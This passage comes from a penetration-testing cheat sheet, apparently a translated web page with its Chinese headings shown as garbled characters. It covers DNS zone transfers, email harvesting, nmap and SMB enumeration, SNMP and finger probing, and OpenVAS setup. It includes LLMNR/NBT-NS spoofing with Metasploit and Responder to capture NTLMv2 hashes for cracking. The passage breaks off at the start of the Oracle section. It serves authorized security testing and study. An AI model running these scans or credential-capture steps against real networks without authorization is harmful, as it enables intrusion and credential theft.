class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois domain-name-here.com</span><br></pre></td></tr></table></figure><h5 id="Êü•ËØ¢DNS-IP"><a href="#Êü•ËØ¢DNS-IP" class="headerlink" title="Êü•ËØ¢DNS IP"></a>Êü•ËØ¢DNS IP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h5 id="Êü•ËØ¢MXËÆ∞ÂΩï"><a href="#Êü•ËØ¢MXËÆ∞ÂΩï" class="headerlink" title="Êü•ËØ¢MXËÆ∞ÂΩï"></a>Êü•ËØ¢MXËÆ∞ÂΩï</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h5 id="Áî®DIG-Êü•ËØ¢Âüü‰º†ÈÄÅ"><a href="#Áî®DIG-Êü•ËØ¢Âüü‰º†ÈÄÅ" class="headerlink" title="Áî®DIG Êü•ËØ¢Âüü‰º†ÈÄÅ"></a>Áî®DIG Êü•ËØ¢Âüü‰º†ÈÄÅ</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h2 id="DNS-Âüü‰º†ÈÄÅ"><a href="#DNS-Âüü‰º†ÈÄÅ" class="headerlink" title="DNS Âüü‰º†ÈÄÅ"></a>DNS Âüü‰º†ÈÄÅ</h2><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></td><td>Windows DNSÂüü‰º†ÈÄÅ</td></tr><tr><td><code>dig axfr blah.com @ns1.blah.com</code></td><td>Linux DNS Âüü‰º†ÈÄÅ</td></tr></tbody></table><h3 id="ÈÇÆ‰ª∂"><a href="#ÈÇÆ‰ª∂" class="headerlink" title="ÈÇÆ‰ª∂"></a>ÈÇÆ‰ª∂</h3><h4 id="Simply-Email"><a href="#Simply-Email" class="headerlink" title="Simply Email"></a>Simply Email</h4><p>‰ΩøÁî®Simply EmailÊûö‰∏æÊâÄÊúâÊâÄÊúâÁΩëÁ´ôÔºàGitHubÔºåÁõÆÊ†áÁ´ôÁÇπÁ≠âÔºâÔºåÈÖç‰∏ä‰ª£ÁêÜÊàñËÆæÁΩÆËæÉÈïøÁöÑËÆøÈóÆÈó¥ÈöîÊó∂Èó¥ÔºåËøôÊ†∑Â∞±‰∏ç‰ºöË¢´GoogleÂèëÁé∞ÊòØÁà¨Ëô´Âπ∂Áî®È™åËØÅÁ†ÅÊã¶‰Ωè‰∫Ü„ÄÇSimply EmailËøòÂèØ‰ª•È™åËØÅÊî∂ÈõÜÁöÑÈÇÆ‰ª∂Âú∞ÂùÄ„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/killswitch-GUI/SimplyEmail.git</span><br><span class="line">./SimplyEmail.py -all -e TARGET-DOMAIN</span><br></pre></td></tr></table></figure><h3 id="Âçä‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ"><a href="#Âçä‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="Âçä‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ"></a>Âçä‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ</h3><h4 id="Âü∫Êú¨ÊåáÁ∫πËØÜÂà´"><a href="#Âü∫Êú¨ÊåáÁ∫πËØÜÂà´" class="headerlink" title="Âü∫Êú¨ÊåáÁ∫πËØÜÂà´"></a>Âü∫Êú¨ÊåáÁ∫πËØÜÂà´</h4><p>ÊâãÂä®ÊåáÁ∫πËØÜÂà´/bannerÊäìÂèñ</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>nc -v 192.168.1.1 25</code> <br><code>telnet 192.168.1.1 25</code></td><td>ÈÄöËøáÊòæÁ§∫bannerËØÜÂà´ÁâàÊú¨ÂíåÊåáÁ∫π</td></tr></tbody></table><h4 id="‰ΩøÁî®NCÊäìÂèñbanner"><a href="#‰ΩøÁî®NCÊäìÂèñbanner" class="headerlink" title="‰ΩøÁî®NCÊäìÂèñbanner"></a>‰ΩøÁî®NCÊäìÂèñbanner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc TARGET-IP 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: TARGET-IP</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Referrer: meh-domain</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure><h3 id="‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ"><a href="#‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ"></a>‰∏ªÂä®‰ø°ÊÅØÊî∂ÈõÜ</h3><h4 id="DNS-ÁàÜÁ†¥"><a href="#DNS-ÁàÜÁ†¥" class="headerlink" title="DNS ÁàÜÁ†¥"></a>DNS ÁàÜÁ†¥</h4><h5 id="DNSRecon"><a href="#DNSRecon" class="headerlink" title="DNSRecon"></a>DNSRecon</h5><table><thead><tr><th>DNS Enumeration Kali - DNSRecon</th></tr></thead><tbody><tr><td>root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std ‚Äìxml ouput.xml</td></tr></tbody></table><h4 id="Á´ØÂè£Êâ´Êèè"><a href="#Á´ØÂè£Êâ´Êèè" class="headerlink" title="Á´ØÂè£Êâ´Êèè"></a>Á´ØÂè£Êâ´Êèè</h4><h5 id="NmapÂëΩ‰ª§"><a href="#NmapÂëΩ‰ª§" class="headerlink" title="NmapÂëΩ‰ª§"></a>NmapÂëΩ‰ª§</h5><p>Êõ¥Â§öÂëΩ‰ª§ÔºåËØ¶ËßÅ <a href="https://highon.coffee/blog/nmap-cheat-sheet/" target="_blank" rel="noopener">NmapÂ§áÂøòÂΩï</a> „ÄÇ</p><p>Âü∫Êú¨Nmap ÂëΩ‰ª§Ôºö</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>nmap -v -sS -A -T4 target</code></td><td>ËØ¶ÁªÜÊòæÁ§∫ÔºåsynÊé¢ÊµãÔºåÈ´òÈÄüÊâ´ÊèèÔºåÁ≥ªÁªüÂíåÊúçÂä°ÁâàÊú¨‰ø°ÊÅØÔºåËÑöÊú¨Êâ´ÊèèÂíåË∑ØÁî±Ë∑üË∏™</td></tr><tr><td><code>nmap -v -sS -p--A -T4 target</code></td><td>Âêå‰∏äÔºå‰∏îÊâ´ÊèèÊâÄÊúâTCPÁ´ØÂè£ÔºåËÄóÊó∂Êõ¥Èïø</td></tr><tr><td><code>nmap -v -sU -sS -p- -A -T4 target</code></td><td>Âêå‰∏äÔºå‰∏îÊâ´ÊèèÊâÄÊúâUDPÁ´ØÂè£ÔºåËÄóÊó∂Â∑®Èïø</td></tr><tr><td><code>nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1 192.168.1.X</code></td><td>Êâ´ÊèèÂèØËÉΩÂåÖÂê´ÊºèÊ¥ûÁöÑSMBÊúçÂä°</td></tr><tr><td>` ls /usr/share/nmap/scripts/*</td><td>grep ftp `</td><td>Âà©Áî®ÂÖ≥ÈîÆÂ≠óÊêúÁ¥¢nmapËÑöÊú¨</td></tr></tbody></table><p>Âà´Âú®Â§ñÁΩëÈááÁî®<code>T4</code> Êâ´ÊèèÔºå‰ΩøÁî®<code>TCP</code> ËøûÊé•Êâ´ÊèèÊó∂Áî®<code>T2</code> ÊØîËæÉÂêàÈÄÇ„ÄÇ<code>T4</code> Êâ´ÊèèÁî®Âú®‰ΩéÂª∂ËøüÈ´òÂ∏¶ÂÆΩÁöÑÂÜÖÈÉ®ÁΩëÁªúÊµãËØï‰ºöÊõ¥ÂêàÈÄÇ„ÄÇ‰ΩÜËøô‰πüÂèñÂÜ≥‰∫éÁõÆÊ†áËÆæÂ§áÔºåÂ¶ÇÊûúÁî®<code>T4/T5</code> Êâ´‰ªñ‰ª¨ÔºåÁªìÊûúÂ∞±ÂèØËÉΩ‰∏çÂáÜÁ°Æ„ÄÇÊÄªÁöÑÊù•ËØ¥ÔºåÊâ´ÊèèË∂äÊÖ¢Ë∂äÂ•ΩÔºå‰πüÂèØ‰ª•ÂÖàÂø´ÈÄüÊâ´Êèè1000‰∏™ÁõÆÊ†áÊñπ‰æø‰∏äÊâãÊµãËØïÔºåÁÑ∂ÂêéÂÜçÊÖ¢ÊÖ¢Êâ´ÂÖ∂‰ΩôÁöÑ„ÄÇ</p><h6 id="Nmap-UDPÊâ´Êèè"><a href="#Nmap-UDPÊâ´Êèè" class="headerlink" title="Nmap UDPÊâ´Êèè"></a>Nmap UDPÊâ´Êèè</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU TARGET</span><br></pre></td></tr></table></figure><h6 id="UDP-ÂçèËÆÆÊâ´ÊèèÂô®"><a href="#UDP-ÂçèËÆÆÊâ´ÊèèÂô®" class="headerlink" title="UDP ÂçèËÆÆÊâ´ÊèèÂô®"></a>UDP ÂçèËÆÆÊâ´ÊèèÂô®</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/portcullislabs/udp-proto-scanner.git</span><br></pre></td></tr></table></figure><p>Êâ´ÊèèÊñá‰ª∂‰∏≠IPÂú∞ÂùÄÁöÑÊâÄÊúâÊúçÂä°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -f ip.txt</span><br></pre></td></tr></table></figure><p>Êâ´ÊèèÁâπÂÆöUDPÊúçÂä°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp-proto-scanner.pl -p ntp -f ips.txt</span><br></pre></td></tr></table></figure><h6 id="ÂÖ∂‰ªñ‰∏ªÊú∫ÂèëÁé∞"><a href="#ÂÖ∂‰ªñ‰∏ªÊú∫ÂèëÁé∞" class="headerlink" title="ÂÖ∂‰ªñ‰∏ªÊú∫ÂèëÁé∞"></a>ÂÖ∂‰ªñ‰∏ªÊú∫ÂèëÁé∞</h6><p>‰∏ç‰ΩøÁî®nmapÂèëÁé∞‰∏ªÊú∫ÁöÑÊñπÊ≥ïÔºö</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>netdiscover -r 192.168.1.0/24</code></td><td>Âà©Áî®Â≠êÁΩëÁöÑÂú∞ÂùÄËß£ÊûêÂçèËÆÆÂèëÁé∞ÂêåÁΩëÊÆµÁöÑIPÔºåMACÂú∞ÂùÄÂíåMACÂéÇÂïÜ</td></tr></tbody></table><h2 id="Êûö‰∏æÂíåÊîªÂáªÁΩëÁªúÊúçÂä°"><a href="#Êûö‰∏æÂíåÊîªÂáªÁΩëÁªúÊúçÂä°" class="headerlink" title="Êûö‰∏æÂíåÊîªÂáªÁΩëÁªúÊúçÂä°"></a>Êûö‰∏æÂíåÊîªÂáªÁΩëÁªúÊúçÂä°</h2><p>Áî®‰∫éËØÜÂà´/Êûö‰∏æÁΩëÁªúÊúçÂä°ÁöÑÂ∑•ÂÖ∑„ÄÇ</p><h3 id="SAMB-SMB-Windows-ÂüüÊûö‰∏æ"><a href="#SAMB-SMB-Windows-ÂüüÊûö‰∏æ" class="headerlink" title="SAMB / SMB / Windows ÂüüÊûö‰∏æ"></a>SAMB / SMB / Windows ÂüüÊûö‰∏æ</h3><h4 id="SambaÊûö‰∏æ"><a href="#SambaÊûö‰∏æ" class="headerlink" title="SambaÊûö‰∏æ"></a>SambaÊûö‰∏æ</h4><h5 id="SMBÊûö‰∏æÂ∑•ÂÖ∑"><a href="#SMBÊûö‰∏æÂ∑•ÂÖ∑" class="headerlink" title="SMBÊûö‰∏æÂ∑•ÂÖ∑"></a>SMBÊûö‰∏æÂ∑•ÂÖ∑</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure><p>ÂΩìÁÑ∂‰πüÂèØÂèÇËÄÉÊú¨Á´ôÁöÑ <a href="https://highon.coffee/blog/nbtscan-cheat-sheet/" target="_blank" rel="noopener">nbtscan ÁöÑÈÄüÊü•Ë°®</a> </p><h5 id="SMB-ÁâàÊú¨ÊåáÁ∫πËØÜÂà´"><a href="#SMB-ÁâàÊú¨ÊåáÁ∫πËØÜÂà´" class="headerlink" title="SMB ÁâàÊú¨ÊåáÁ∫πËØÜÂà´"></a>SMB ÁâàÊú¨ÊåáÁ∫πËØÜÂà´</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.1.100</span><br></pre></td></tr></table></figure><h5 id="ÂØªÊâæÂºÄÊîæÁöÑSMBÂÖ±‰∫´"><a href="#ÂØªÊâæÂºÄÊîæÁöÑSMBÂÖ±‰∫´" class="headerlink" title="ÂØªÊâæÂºÄÊîæÁöÑSMBÂÖ±‰∫´"></a>ÂØªÊâæÂºÄÊîæÁöÑSMBÂÖ±‰∫´</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24</span><br></pre></td></tr></table></figure><h5 id="Êûö‰∏æSMBÁî®Êà∑"><a href="#Êûö‰∏æSMBÁî®Êà∑" class="headerlink" title="Êûö‰∏æSMBÁî®Êà∑"></a>Êûö‰∏æSMBÁî®Êà∑</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</span><br></pre></td></tr></table></figure><p>RIDÂæ™ÁéØÔºàRID Cycling Ôºâ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</span><br></pre></td></tr></table></figure><p>MetasploitÁöÑRIDÂæ™ÁéØÊîªÂáªÊ®°Âùó</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure><h6 id="ÊâãÂä®ÊµãËØïÁ©∫‰ºöËØù"><a href="#ÊâãÂä®ÊµãËØïÁ©∫‰ºöËØù" class="headerlink" title="ÊâãÂä®ÊµãËØïÁ©∫‰ºöËØù"></a>ÊâãÂä®ÊµãËØïÁ©∫‰ºöËØù</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">net use \\TARGET\IPC$ &quot;&quot; /u:&quot;&quot;</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">smbclient -L //192.168.99.131</span><br></pre></td></tr></table></figure><h6 id="NBTScan-unixwiz"><a href="#NBTScan-unixwiz" class="headerlink" title="NBTScan unixwiz"></a>NBTScan unixwiz</h6><p>Âú®Kali‰∏äÂÆâË£Ö‰ΩøÁî®Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nbtscan-unixwiz </span><br><span class="line">nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan</span><br></pre></td></tr></table></figure><h4 id="LLMNR-NBT-NSÊ¨∫È™ó"><a href="#LLMNR-NBT-NSÊ¨∫È™ó" class="headerlink" title="LLMNR / NBT-NSÊ¨∫È™ó"></a>LLMNR / NBT-NSÊ¨∫È™ó</h4><p>‰ªéÁΩëÁªú‰∏≠Á™ÉÂèñÂá≠ËØÅ</p><h5 id="‰ΩøÁî®MetasploitËøõË°å-LLMNR-NetBIOSËØ∑Ê±Ç"><a href="#‰ΩøÁî®MetasploitËøõË°å-LLMNR-NetBIOSËØ∑Ê±Ç" class="headerlink" title="‰ΩøÁî®MetasploitËøõË°å LLMNR / NetBIOSËØ∑Ê±Ç"></a>‰ΩøÁî®MetasploitËøõË°å LLMNR / NetBIOSËØ∑Ê±Ç</h5><p>Ê¨∫È™ó/ÊØíÂåñ LLMNR / NetBIOSËØ∑Ê±ÇÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/spoof/llmnr/llmnr_response</span><br><span class="line">auxiliary/spoof/nbns/nbns_response</span><br></pre></td></tr></table></figure><p>ÊäìÂèñÂìàÂ∏å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/capture/smb</span><br><span class="line">auxiliary/server/capture/http_ntlm</span><br></pre></td></tr></table></figure><p>ÊúÄÂêé‰ºöÂæóÂà∞NTLMv2 ÂìàÂ∏åÔºåÂèØ‰ª•‰ΩøÁî®johnÊàñËÄÖhashcatÁ†¥Ëß£„ÄÇ</p><h5 id="Responder-py"><a href="#Responder-py" class="headerlink" title="Responder.py"></a>Responder.py</h5><p>‰Ω†‰πüÂèØ‰ª•ÈÄâÊã©‰ΩøÁî® responder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SpiderLabs/Responder.git</span><br><span class="line">python Responder.py -i local-ip -I eth0</span><br></pre></td></tr></table></figure><p>Ê≥®ÔºöÊï¥‰∏™Ê∏óÈÄèÊµãËØïËøáÁ®ãÂèØ‰ª•‰∏ÄÁõ¥ÂÖÅËÆ∏Responder.py</p><h4 id="SNMPÊûö‰∏æÂ∑•ÂÖ∑"><a href="#SNMPÊûö‰∏æÂ∑•ÂÖ∑" class="headerlink" title="SNMPÊûö‰∏æÂ∑•ÂÖ∑"></a>SNMPÊûö‰∏æÂ∑•ÂÖ∑</h4><p>SNMPÊûö‰∏æÂ∑•ÂÖ∑ÊúâÂæàÂ§ö„ÄÇ</p><p>ÁæéÂåñSNMPËæìÂá∫ÁªìÊûú‰ΩøÊòì‰∫éÈòÖËØª„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp-mibs-downloader download-mibs</span><br><span class="line">echo &quot;&quot; &gt; /etc/snmp/snmp.conf</span><br></pre></td></tr></table></figure><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>snmpcheck -t 192.168.1.X -c public</code><br>` snmpwalk -c public -v1 192.168.1.X 1</td><td>grep hrSWRunName</td><td>cut -d<em> </em> -f  <code>&lt;br /&gt;</code> snmpenum -t 192.168.1.X <code>&lt;br /&gt;</code> onesixtyone -c names -i hosts `</td><td>SNMPÊûö‰∏æ</td></tr></tbody></table><h5 id="SNMPv3Êûö‰∏æÂ∑•ÂÖ∑"><a href="#SNMPv3Êûö‰∏æÂ∑•ÂÖ∑" class="headerlink" title="SNMPv3Êûö‰∏æÂ∑•ÂÖ∑"></a>SNMPv3Êûö‰∏æÂ∑•ÂÖ∑</h5><p>‰ΩøÁî®nmapËØÜÂà´SNMPv3ÊúçÂä°Âô®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 161 --script=snmp-info TARGET-SUBNET</span><br></pre></td></tr></table></figure><p>Rory McCune ÁöÑËÑöÊú¨ÂèØ‰ª•Â∏ÆÂä©Ëá™Âä®ÂåñÊûö‰∏æSNMPv3ÁöÑÁî®Êà∑ÂêçÊûö‰∏æ„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp snmp-mibs-downloader</span><br><span class="line">wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèÔºö‰∏ãÈù¢ÁöÑË∑ØÂæÑÊòØKali‰∏äMetasploitÁöÑSNMP v1Âíåv2ÁöÑÊîªÂáªÂ≠óÂÖ∏ÔºåÊõ¥Êñ∞ÁöÑÂ≠óÂÖ∏ÂèØ‰ª•ÂèÇËÄÉDaniel Miessler <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">Âú®GitHub‰∏äÁöÑÂÆâÂÖ®ÂàóË°®</a> „ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</span><br></pre></td></tr></table></figure><h4 id="ËøúÁ®ãÊúçÂä°Êûö‰∏æ"><a href="#ËøúÁ®ãÊúçÂä°Êûö‰∏æ" class="headerlink" title="ËøúÁ®ãÊúçÂä°Êûö‰∏æ"></a>ËøúÁ®ãÊúçÂä°Êûö‰∏æ</h4><p>ËøôÂ∑≤ÊòØËÄÅÁîüÂ∏∏Ë∞àÔºå‰ΩÜ‰∏∫‰∫ÜÊú¨ÊñáÂÜÖÂÆπÁöÑÂÖ®Èù¢ËøòÊòØÂåÖÂê´Â¶Ç‰∏ã„ÄÇ</p><p><code>nmap -A</code> ‰ºöËøõË°å‰∏ãÈù¢Âàó‰∏æÁöÑÊâÄÊúâËøúÁ®ãÊúçÂä°ÁöÑÊûö‰∏æÔºåÊâÄ‰ª•ËøôÈáåÂè™ÊòØÈ°∫‰æøÊèêÂèä„ÄÇ</p><h5 id="RSH-Êûö‰∏æ"><a href="#RSH-Êûö‰∏æ" class="headerlink" title="RSH Êûö‰∏æ"></a>RSH Êûö‰∏æ</h5><h6 id="RSHËøêË°åÂëΩ‰ª§"><a href="#RSHËøêË°åÂëΩ‰ª§" class="headerlink" title="RSHËøêË°åÂëΩ‰ª§"></a>RSHËøêË°åÂëΩ‰ª§</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsh &lt;target&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure><h6 id="MetasploitRSH-ÁôªÈôÜÊâ´Êèè"><a href="#MetasploitRSH-ÁôªÈôÜÊâ´Êèè" class="headerlink" title="MetasploitRSH ÁôªÈôÜÊâ´Êèè"></a>MetasploitRSH ÁôªÈôÜÊâ´Êèè</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure><h6 id="‰ΩøÁî®rusersÊòæÁ§∫Â∑≤ÁôªÈôÜÁî®Êà∑"><a href="#‰ΩøÁî®rusersÊòæÁ§∫Â∑≤ÁôªÈôÜÁî®Êà∑" class="headerlink" title="‰ΩøÁî®rusersÊòæÁ§∫Â∑≤ÁôªÈôÜÁî®Êà∑"></a>‰ΩøÁî®rusersÊòæÁ§∫Â∑≤ÁôªÈôÜÁî®Êà∑</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rusers -al 192.168.2.1</span><br></pre></td></tr></table></figure><h6 id="‰ΩøÁî®rloginÊâ´ÊèèÊï¥‰∏™Â≠êÁΩë"><a href="#‰ΩøÁî®rloginÊâ´ÊèèÊï¥‰∏™Â≠êÁΩë" class="headerlink" title="‰ΩøÁî®rloginÊâ´ÊèèÊï¥‰∏™Â≠êÁΩë"></a>‰ΩøÁî®rloginÊâ´ÊèèÊï¥‰∏™Â≠êÁΩë</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l &lt;user&gt; &lt;target&gt;</span><br><span class="line">e.g rlogin -l root TARGET-SUBNET/24</span><br></pre></td></tr></table></figure><h4 id="‰ΩøÁî®fingerÊûö‰∏æ"><a href="#‰ΩøÁî®fingerÊûö‰∏æ" class="headerlink" title="‰ΩøÁî®fingerÊûö‰∏æ"></a>‰ΩøÁî®fingerÊûö‰∏æ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">finger @TARGET-IP</span><br><span class="line">finger batman@TARGET-IP</span><br></pre></td></tr></table></figure><h5 id="Âà©Áî®SolarisÁöÑbugÊòæÁ§∫ÊâÄÊúâÂ∑≤ÁôªÂΩïÁî®Êà∑"><a href="#Âà©Áî®SolarisÁöÑbugÊòæÁ§∫ÊâÄÊúâÂ∑≤ÁôªÂΩïÁî®Êà∑" class="headerlink" title="Âà©Áî®SolarisÁöÑbugÊòæÁ§∫ÊâÄÊúâÂ∑≤ÁôªÂΩïÁî®Êà∑"></a>Âà©Áî®SolarisÁöÑbugÊòæÁ§∫ÊâÄÊúâÂ∑≤ÁôªÂΩïÁî®Êà∑</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">finger 0@host  </span><br><span class="line"></span><br><span class="line">SunOS: RPC services allow user enum:</span><br><span class="line">$ rusers # users logged onto LAN</span><br><span class="line"></span><br><span class="line">finger &apos;a b c d e f g h&apos;@sunhost</span><br></pre></td></tr></table></figure><h4 id="rwho"><a href="#rwho" class="headerlink" title="rwho"></a>rwho</h4><p>‰ΩøÁî®nmapËØÜÂà´ËøêË°årwhodÊúçÂä°Ôºà513Á´ØÂè£ÔºåUDPÂçèËÆÆÔºâÁöÑÊú∫Âô®„ÄÇ</p><h2 id="TLS-amp-SSL-ÊµãËØï"><a href="#TLS-amp-SSL-ÊµãËØï" class="headerlink" title="TLS&amp;SSL ÊµãËØï"></a>TLS&amp;SSL ÊµãËØï</h2><h3 id="testssl-sh"><a href="#testssl-sh" class="headerlink" title="testssl.sh"></a>testssl.sh</h3><p>ÊµãËØïÂçï‰∏Ä‰∏ªÊú∫Âπ∂Â∞ÜÁªìÊûúËæìÂá∫ÁöÑHTMLÊñá‰ª∂Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html</span><br></pre></td></tr></table></figure><h2 id="ÊºèÊ¥ûËØÑ‰º∞"><a href="#ÊºèÊ¥ûËØÑ‰º∞" class="headerlink" title="ÊºèÊ¥ûËØÑ‰º∞"></a>ÊºèÊ¥ûËØÑ‰º∞</h2><p>Âú®Kali Rolling‰∏äÂÆâË£ÖOpenVAS 8 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br></pre></td></tr></table></figure><p>Á°ÆËÆ§openvas  Ê≠£Âú®ËøêË°åÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulpn</span><br></pre></td></tr></table></figure><p>ÈÄöËøá<code>https://127.0.0.1:9392</code> ÁôªÈôÜopenvasÔºåÂØÜÁ†ÅÊòØÂú®ÂÆâË£ÖÊó∂ËÆæÁΩÆÂ•ΩÁöÑ„ÄÇ</p><h2 id="Êï∞ÊçÆÂ∫ìÊ∏óÈÄèÊµãËØï"><a href="#Êï∞ÊçÆÂ∫ìÊ∏óÈÄèÊµãËØï" class="headerlink" title="Êï∞ÊçÆÂ∫ìÊ∏óÈÄèÊµãËØï"></a>Êï∞ÊçÆÂ∫ìÊ∏óÈÄèÊµãËØï</h2><p>ÊîªÂáªÊö¥Èú≤Âú®‰∫íËÅîÁΩë‰∏äÁöÑÊï∞ÊçÆÂ∫ì„ÄÇ</p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>ÂÆâË£Ö oscannerÔºö</p><figure 